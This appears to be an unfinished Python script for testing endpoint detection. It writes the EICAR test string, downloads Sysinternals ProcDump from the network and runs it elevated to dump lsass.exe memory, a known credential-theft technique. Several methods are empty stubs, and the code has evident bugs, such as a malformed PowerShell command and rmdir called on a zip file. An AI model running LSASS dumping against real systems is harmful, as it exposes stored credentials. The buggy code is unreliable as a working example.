import subprocess as sp
from time import sleep
import os
from zipfile import ZipFile
import re
#import sys


#CS_PATH = r"C:\Windows\System32\drivers\CrowdStrike"


class EPScenario:
    def __init__(self, ps, cmd, baseDir):
        self.PS = ps
        self.CMD = cmd
        self.baseDir = baseDir

    def _get_user(self):
        _user = sp.check_output([PS, "-Command", "whoami"], text=True)
        user_lst = _user.split('\\')
        temp = user_lst[1]
        cleaned_user = temp.replace("\n", "")
        return cleaned_user
    
    def make_Eicar(self):
        # Generate EICAR file
        try:
            user = self._get_user()
            sleep(2)
            os.chdir(f"C:\\Users\\{user}\\OneDrive\\Desktop") # Remove OneDrive before push
                # EICAR file not recognized as malicious by Windows? May need to execute file.
            with open("EICAR.txt", "w") as f:
                f.write(r"X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*")
            print(f"File created: EICAR.txt")

        except FileNotFoundError as e:
            print("Path not found.\n")
            path = input("Enter path manually:\n")
            os.chdir(path=path)

            with open("EICAR.txt", "w") as f:
                f.write(r"X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*")

    def cs_alerts(self):
        sp.check_output([self.CMD, "-Command", ])
        # Generate CrowdStrike alerts via cmd in proj-notes.txt
        pass

    def _dump_setup(self):
        os.mkdir(self.baseDir+"ProcDump") # make procdump dir on desktop
        os.mkdir(self.baseDir+"Dump")
        full_path = self.baseDir+"ProcDump" # join base_dir with new procdump folder
        
        return full_path
    
    def dump_lsass(self):
        path = self._dump_setup() # base_dir\\ProcDump
        procZip = "Procdump.zip"

        sp.call([PS, "-Command", f"""Invoke-WebRequest https://download.sysinternals.com/files/Procdump.zip -OutFile {self.baseDir}Procdump.zip"""] ,shell=True, text=True)
        joined_path = self.baseDir+procZip
    
        with ZipFile(joined_path, "r") as procObject:
            procObject.extractall(path=path)
    
        try:
            sp.call([PS, "-Command", r"""-ArgumentList @({}\\ .\procdump64.exe -accepteula -ma lsass.exe {}Dump\\lsass.dmp)) -Verb RunAs""".format(path, self.baseDir)])
            sleep(3)
            
            print("Initialized ProcDump in Dump directory!\n")
            print(f"Lsass.dmp created at: {self.baseDir}\\Dump..\nStarting cleanup.....\n")
            
            os.rmdir(f"{self.baseDir}\\Dump")
            os.rmdir(f"{self.baseDir}\\ProcDump")
            os.rmdir(f"{self.baseDir}\\Procdump.zip")

            rm_output = sp.check_output([self.PS, "-Command", f"ls {self.baseDir}"])
            match = re.search(r"\bdump\b", rm_output)
            if match:
                print("Cleaning done!\n")
            else:
                print("Cleaning files failed!\n")
        except PermissionError as e:
            print("Execution failed.\n")


        # Use procdump (sysInternals) to dump lsass.exe

    def _check_S_solutions(self):
        # Check whether Cisco AMP, Symantec, or CrowdStrike is present on the EP.
        pass

    def download_files(self):
        # Based on the previous function, define ways to extract said files mentioned in notes.
        pass

    def surf_limits(self):
        # Check default browser, 
        pass


if __name__ == '__main__':
    # Global Variables:
    PS = os.path.expandvars(r"%SystemRoot%\system32\WindowsPowerShell\v1.0\powershell.exe")
    CMD = os.path.expandvars(r"%SystemRoot%\system32\cmd.exe")
    desktopPath = r"C:\\Users\\raham\\OneDrive\\Desktop\\"
    #EP_obj = EPScenario(ps=PS,cmd=CMD, baseDir=desktopPath).make_Eicar()
    EP_obj1 = EPScenario(ps=PS, cmd=CMD, baseDir=desktopPath).dump_lsass()